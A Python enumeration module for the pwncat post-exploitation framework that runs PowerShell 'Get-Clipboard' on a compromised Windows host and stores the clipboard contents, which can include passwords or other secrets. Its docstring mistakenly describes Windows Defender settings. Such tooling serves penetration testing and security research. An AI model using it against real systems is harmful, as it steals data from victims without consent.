#!/usr/bin/env python3

from typing import Any, Dict, List

import pwncat
import rich.markup
from pwncat import util
from pwncat.db import Fact
from pwncat.modules import ModuleFailed
from pwncat.modules.enumerate import EnumerateModule, Schedule
from pwncat.platform import PlatformError
from pwncat.platform.windows import PowershellError, Windows


class ClipboardData(Fact):
    def __init__(self, source, contents:str):
        super().__init__(source=source, types=["system.clipboard"])

        self.contents: bool = contents


    def title(self, session):
        return f"Current clipboard contents:"
    def description(self, session):
        return f"[yellow]{rich.markup.escape(self.contents)}[/yellow]"


class Module(EnumerateModule):
    """Enumerate the current Windows Defender settings on the target"""

    PROVIDES = ["system.clipboard"]
    PLATFORM = [Windows]

    def enumerate(self, session):


        try:
            result = session.platform.powershell(
                f"Get-Clipboard"
            )

            if not result:
                raise ModuleFailed(
                    f"failed to retrieve clipboard contents"
                )

            if isinstance(result[0],list):
                contents = "\n".join(result[0])
            else:
                contents = result[0]

        except PowershellError as exc:
            raise ModuleFailed(
                f"failed to retrieve clipboard contents"
            ) from exc

        yield ClipboardData(self.name, contents)
